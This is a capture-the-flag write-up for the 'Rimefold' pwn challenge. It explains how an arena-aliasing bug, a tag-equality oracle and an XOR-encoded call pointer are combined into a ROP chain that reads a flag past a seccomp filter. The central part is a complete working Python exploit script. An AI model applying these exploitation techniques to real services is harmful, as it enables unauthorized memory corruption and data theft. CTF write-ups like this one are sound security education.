---
title: "Rimefold"
category: "Pwn"
tags: ["rop", "pointer-encoding"]
solve_date: "2026-10-10T14:30:00+07:00"
language: "en"
---

# Rimefold

**Flag:** `isfcr{the_merge_3b7d_never_rechecked_the_hue_00cb8b04}`
**Service:** `nc 0.cloud.chals.io 15036`
**Files:** `coldpack` (755,760 bytes; SHA-256 `15E73D7F1C6F1E6BC39E68184AF2FCBE32F8F1B8BFFF44AD0E9C95976364635A`), `COLDPACK.md`, `seccomp.txt`

## Challenge

`coldpack` is a static-PIE, stripped service that moves 256-byte "record cells" through a 64-cell staging arena. Commands: `NEW`, `DEL`, `STAGE`, `FOLD`, `REAP`, `DRAW`, `PACK`, `STAT`, `HELLO`, `QUIT`. No command ever prints an address. The process arms a seccomp filter that only allows `read`, `write`, `close`, `fstat`, `mmap`, `munmap`, `mprotect`, `exit`, `exit_group`, `rt_sigreturn` - so there is no `execve`/`openat`, and the flag is only reachable through the file descriptor the process already holds.

The handout binary is the **1.3 bench** build; the live head reports **abi 1.4** (`coldpack rimefold abi 1.4 ready id=<32 hex>`) and behaves differently. Everything below was confirmed against the live head.

## Initial Analysis

Reversing the handout gives the arena layout. The arena is a single `mmap(0, 0x5000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0)` region whose first 128 bytes are a control block, followed by the 64 cell bodies (`base + 0x80 + 0x100*i`):

| Offset | Meaning (1.3) | Live 1.4 value |
|---|---|---|
| `+0x00` | reaper entry pointer (`farm + 1`, i.e. a bare `ret`) | encoded pointer, looks random |
| `+0x08` | argument passed in `rdi` | `0` |
| `+0x10` | pointer to the gadget farm | `arena + 0xcce0` (fixed) |
| `+0x18` | arena base (self) | `arena` |
| `+0x20` | flag descriptor | `5` |
| `+0x28` | signature constant | `0x8b1e3fd7c0a64521` |
| `+0x30` | reap counter | increments per `REAP` |

The gadget farm is a 15-byte block of hand-written ROP gadgets:

```
farm+0   pop rax ; ret        farm+8   syscall ; ret
farm+2   pop rdi ; ret        farm+11  mov rsp, rdi ; ret
farm+4   pop rsi ; ret
farm+6   pop rdx ; ret
```

The vulnerability is in `REAP`. It walks the staging ring looking for runs of consecutive cells that share a "cluster tag"; for every run longer than 6 it re-points the run's **last** cell at the control block: `cells[last].ptr = arena; cells[last].cap = 16`. Because `DRAW`/`PACK` follow `cells[i].ptr` and never re-check whether the cell is live, this turns into an arbitrary 128-byte read/write primitive over the control block. The same `REAP` then does the equivalent of `rdi = block[1]; call block[0]`.

Cells are tagged once at startup and the tags are re-randomised per connection, but `FOLD` leaks tag equality: staging two cells and folding returns `OK folded 1` exactly when their tags match. That is the oracle used to find a 7-cell run.

## Exploitation Chain

### 1. Find seven same-tag live cells

Allocate ~60 cells, then bucket them pairwise through the `FOLD` oracle (each test is `STAGE a b` + `FOLD`). With ~8 distinct tags over 60 cells a class of 7 or more appears within the first round or two.

### 2. Alias the control block

`STAGE <the 7-8 cells>` then `REAP` returns `OK reaped 7` and aliases the last staged cell. `DRAW <that cell> 16` now dumps the block: the signature at qword 5 confirms the primitive, and qwords 2/3/4 give the gadget-farm address, the arena base and the flag descriptor.

### 3. The 1.4 difference: the reaper pointer is *encoded*, not sealed

On 1.3 `block[0]` is literally `farm + 1`. On 1.4 the same slot holds a value that looks like random noise, and writing **any** other value into it kills the connection immediately. That looks like a tamper seal, and it is a trap: `REAP` does not compare the field, it *decodes* it. The live head computes

```
target = block[0] ^ mask          where  mask = block[0]_original ^ (block[2] + 1)
```

so the untouched value decodes to `farm + 1` (a harmless `ret`, which is exactly why it survives), while every hand-written address decodes into unmapped garbage - which is why a "correct looking" `mov rsp, rdi; ret` address produced a silent death instead of output. Nothing else in the block is validated: `block[1]`, `block[2]`, `block[3]` and the counter are inert, and `block[2] - block[3]` is a constant `0xcce0`, so the image base is simply `arena + 0x5000` and the gadget offsets are unchanged from the handout.

Since `block[0]` and `block[2]` are both readable in step 2, the mask is recoverable, so any call target can be produced: `block[0] = mask ^ chosen_target`.

### 4. ROP to exfiltrate

`REAP` passes `block[1]` in `rdi`, so `block[0] = mask ^ (base + farm + 11)` (`mov rsp, rdi; ret`) pivots the stack into a chain written into an ordinary cell, and the chain performs `read(flag_fd, buf, 256)` followed by `write(1, buf, 256)` - the only syscalls the filter allows.

One more 1.4 quirk matters here: `PACK` parses its arguments with `strtoull(..., 0)`, not base 16, so a zero-padded hex token is read as **octal** (`0000000000000100` stores `0x40`) and a token containing `a`-`f` is rejected with `ERR arg`. Sending the numbers as decimal avoids the ambiguity.

The full solve (plain `socket`, no dependencies). Each connection has to rediscover its own tag class, so no state is reused between attempts:

```python
import socket, struct, re

HOST, PORT = "0.cloud.chals.io", 15036
MAGIC = 0x8B1E3FD7C0A64521
POP_RAX, POP_RDI, POP_RSI, POP_RDX = 0x7CE0, 0x7CE2, 0x7CE4, 0x7CE6
SYSCALL, PIVOT = 0x7CE8, 0x7CEB          # offsets inside the gadget farm
M = (1 << 64) - 1

class Sess:
    def __init__(self):
        self.f = socket.create_connection((HOST, PORT), timeout=30)
        self.f.settimeout(30)
        self.b = self.rd()
    def rd(self):
        buf = b""
        while not buf.endswith(b"\n"):
            c = self.f.recv(4096)
            if not c:
                break
            buf += c
        return buf.decode(errors="replace").strip()
    def cmd(self, line):
        self.f.sendall(line.encode() + b"\n")
        return self.rd()
    def cmds(self, lines):
        self.f.sendall(("\n".join(lines) + "\n").encode())
        return [self.rd() for _ in lines]

def vals(line):
    p = line.split()
    return [int(x, 16) for x in p[1:]] if len(p) > 1 and p[0] == "OK" else None

s = Sess()
cells = [int(r.split()[-1]) for r in s.cmds(["NEW"] * 60) if r.startswith("OK cell")]

# 1. bucket cells by cluster tag using FOLD as an equality oracle
pool, group = cells[:], []
while pool and len(group) < 7:
    rep, rest = pool[0], pool[1:]
    replies = s.cmds(sum([["STAGE %d %d" % (rep, c), "FOLD"] for c in rest], []))
    same = [c for i, c in enumerate(rest)
            if replies[2 * i + 1].endswith(" 1") and replies[2 * i + 1].startswith("OK folded")]
    group = [rep] + same
    pool = [c for c in rest if c not in group]
assert len(group) >= 7, "no 7-cell tag class (retry the connection)"
grp, last = group[:8], group[:8][-1]

# 2. alias the control block and leak it
s.cmds(["STAGE " + " ".join(map(str, grp)), "REAP"])
blk = vals(s.cmd("DRAW %d 16" % last))
assert blk[5] == MAGIC
enc, farm, arena, fd = blk[0], blk[2], blk[3], blk[4]
base = farm - 0x7CE0                      # image base (== arena + 0x5000)
mask = enc ^ (farm + 1)                   # reaper pointer is XOR-encoded

# 3. build the chain inside a normal cell (decimal arguments: PACK parses base 0)
cell = grp[0]
cell_addr = arena + 0x80 + 0x100 * cell
buf = cell_addr + 0x100
chain = [base + POP_RDI, fd, base + POP_RSI, buf, base + POP_RDX, 256,
         base + POP_RAX, 0, base + SYSCALL,          # read(fd, buf, 256)
         base + POP_RDI, 1, base + POP_RAX, 1, base + SYSCALL]   # write(1, buf, 256)
s.cmd("PACK %d %s" % (cell, " ".join(str(v) for v in chain)))
s.cmd("PACK %d %s" % (last, " ".join(str(v & M) for v in
          [mask ^ (base + PIVOT), cell_addr] + blk[2:])))

# 4. REAP decodes block[0] -> mov rsp,rdi ; ret -> chain -> flag on stdout
s.cmd("REAP")
data = b""
try:
    while True:
        c = s.f.recv(65536)
        if not c:
            break
        data += c
except socket.timeout:
    pass
print(re.findall(rb"isfcr\{[0-9a-z_]*\}", data))
```

Live run produced, immediately after the `OK reaped 0` reply on the same connection:

```text
isfcr{the_merge_3b7d_never_rechecked_the_hue_00cb8b04}
```

## Alternative Routes Ruled Out

* **Writable/executable arena:** shellcode placed in the arena and jumped at faults (arena is `PROT_READ|PROT_WRITE` only), so no in-place code.
* **Reading the sealed record directly:** the value in `block[2]` is `arena + 0xcce0`, i.e. inside the mapping, but `DRAW`/`PACK` can only reach the block (`0x80` bytes) and the cell bodies (up to `arena + 0x4180`). The alias base does not follow `block[2]`, `block[3]`, the reap counter or the run length (a longer run still yields `ptr = arena`, `cap = 16`, and `DRAW n 17` returns `ERR range`).
* **Free-list overflow into `.bss`:** `NEW` takes its cell index from `next_free[head]` unchecked (only `head` is range-checked), and `head` is attacker-writable through the in-band link. Measured `next_free` by pre-writing links: it is a clean permutation of 0..63 (`next_free[63]=9`, `[0]=31`, `[1]=15`, `[2]=40`, `[40]=59`, ...), so no index >= 64 is reachable and the alias-base global can't be overwritten that way.
* **Compaction that moves data:** markers written into all 64 cells stayed in place across single-cell, sorted, reversed and grouped `REAP` passes; nothing relocates the sealed record into view.
* **Treating `block[0]` as a seal to satisfy:** no field combination produced any output or memory change (`rdi` tried as pointer, index, length, forged records prefixed with the signature constant), which is what pointed at the decode rather than the compare.
* **Extra verbs in 1.4:** 86 candidate verbs all answered `ERR verb`.

## Flag

```text
isfcr{the_merge_3b7d_never_rechecked_the_hue_00cb8b04}
```

## Reproduce

Requires Python 3 and outbound access to the instance; no third-party packages. Save the script as `solve.py` and run it - if the first attempt reports "no 7-cell tag class", run it again (tags and the encoded reaper pointer are re-randomised per connection):

```powershell
python solve.py
```

For the static part, the control block, the alias condition (`run length > 6` in the defragmenter) and the gadget farm can be checked in the handout with radare2:

```bash
r2 -e bin.relocs.apply=true -e anal.calls=true -c 'aa; pdf @ main; af @ 0x84d0; pdf @ 0x84d0; pd 16 @ 0x7ce0' coldpack
./coldpack --dump-seccomp          # reproduces seccomp.txt
```
